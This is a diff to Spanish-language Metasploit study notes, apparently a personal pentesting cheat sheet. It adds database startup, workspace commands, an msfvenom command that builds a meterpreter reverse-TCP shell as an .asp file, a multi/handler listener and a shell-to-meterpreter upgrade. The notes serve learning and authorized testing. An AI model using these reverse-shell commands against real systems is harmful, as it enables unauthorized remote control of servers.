@@ -8,21 +8,27 @@
 La primera vez ejecuta:
 
 ```bash
+service postgresql start
+
 msfdb run
+```
+
+El resto:
+
+```bash
+service postgresql start && msfconsole
 ```
 
 ## Workspaces
 
-Con `workspace` podemos ver el área de trabajo actual.
+Con `workspace` podemos ver el área de trabajo actual. Con `workspace -h` todas las opciones.
 
 Para añadir uno nuevo, podemos usar:
-
 ```bash
 workspace -a <nombre>
 ```
 
 Para cambiar de uno a otro:
-
 ```bash
 workspace <nombre>
 ```
@@ -113,3 +119,28 @@ O con [[msfvenom]]:
 msfvenom -l payloads
 ```
 
+### Crear payload con msfvenom
+
+Por ejemplo para crear un `.asp`:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
+## Listener
+
+```bash
+use multi/handler
+set LHOST=<ip>
+set LPORT=<port>
+run
+```
+
+## Meterpreter
+
+Upgradear shell a meterpreter:
+```bash
+search shell_to_meterpreter
+
+session -u 1
+```
